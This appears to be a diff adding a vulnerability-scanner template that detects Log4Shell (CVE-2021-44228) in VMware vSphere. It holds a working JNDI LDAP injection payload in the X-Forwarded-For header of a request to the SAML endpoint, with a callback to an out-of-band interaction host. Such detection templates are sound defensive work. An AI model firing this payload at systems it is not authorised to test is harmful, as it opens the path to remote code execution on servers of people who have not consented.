@@ -1,0 +1,30 @@
+id: cve-2021-44228-vmware-vsphere-log4j2-rce
+info:
+  name: VMware vSphere log4j2 RCE (CVE-2021-44228)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Various VMware products such as VMware Horizon, VMware vCenter Server, VMware HCX, VMware NSX-T Data Center, etc. are affected by the remote code execution vulnerability CVE-2021-44228. Attackers can use this vulnerability to execute remote code and potentially gain control of server permissions.
+  reference:
+    - https://www.vmware.com/security/advisories/VMSA-2021-0028.html
+
+variables:
+  dnslog: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        GET /websso/SAML2/SLO/vsphere.local?SAMLRequest= HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: ${jndi:ldap://{{dnslog}}}
+    unsafe: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: word
+        part: interactsh_request
+        words:
+          - "${jndi:ldap://"
